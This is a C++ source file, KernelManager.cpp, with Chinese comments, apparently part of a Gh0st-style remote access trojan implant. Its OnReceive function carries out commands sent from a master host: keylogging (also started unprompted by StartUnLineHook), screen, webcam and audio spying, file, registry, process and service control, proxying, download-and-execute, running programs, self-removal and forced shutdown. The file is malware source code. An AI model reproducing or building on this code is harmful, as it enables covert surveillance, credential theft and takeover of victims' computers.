// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "KernelManager.h"
#include "loop.h"
#include "until.h"

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////
extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
extern TCHAR szGetGroup[256];  //分组唯一标识

CKernelManager::CKernelManager(CClientSocket *pClient,
	LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{

	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;

}


CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
void CKernelManager::StartUnLineHook()
{	
	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	threadInfo *pInfo = new threadInfo;
	memset(pInfo,0,sizeof(threadInfo));	
	lstrcpy(pInfo->m_strMasterHost ,m_strMasterHost);
	pInfo->m_nMasterPort = m_nMasterPort;

	switch (lpBuffer[0])
	{
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		m_pClient->nHeartBeatCount++;
		break;
	case COMMAND_SCREEN_SPY:       // 屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)pInfo, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: //键盘记录	
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//通知打开键盘记录窗口
			(LPVOID)pInfo, 0, NULL);
		Sleep(1);		
		break;
	case COMMAND_LIST_DRIVE:       // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)pInfo, 0, NULL, false);
		break;
	case COMMAND_PROXY_MAP:       // Socket
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProxyManager, 
			(LPVOID)pInfo, 0, NULL, false);
		break;
	case COMMAND_SYSTEM0:   //系统信息
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemsManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SYSTEM1:   //窗口管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_WindowsManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SYSTEM2:   //进程管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProgressManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SYSTEM3:   //网络状态
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_GetNetState ,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SYSTEM4:   //应用程序
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AppManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SYSTEM5:   //启动项
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DllQDXGLManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_SERVICE_MANAGER: //服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_REGEDIT:         //注册表管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)pInfo,0, NULL);
		break;
	case COMMAND_WEBCAM:          // 视频插件
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_AUDIO:            // 音频监听
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)pInfo, 0, NULL);
		break;
	case COMMAND_Screensp:          // WIN10全屏
		Loop_Screen();
		break;
	case		COMMAND_Run:
		UpXRUN((char *)lpBuffer + 1);
		break;
	case COMMAND_ReStart_Exp: // 重启Exp
		CloseHandle(MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReStartExp,
			(LPVOID)(lpBuffer + 1), 0, NULL));
		break;
	case COMMAND_DOWN_EXEC: //下载执行
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL);
		break;
	case COMMAND_RENAME_REMARK:    // 更改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP:     // 更改分组
		SetInfo(szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		break;
	case COMMAND_REMOVE:           // 卸载自身
		UnInstallServer();
		break;
	case COMMAND_SESSION:          // 会话管理
		ShutdownWindows(lpBuffer[1]);
		break;

	}
}

void CKernelManager::ShutdownWindows(DWORD dwReason)
{
	EnablePrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	EnablePrivilege(SE_SHUTDOWN_NAME,FALSE);	
}
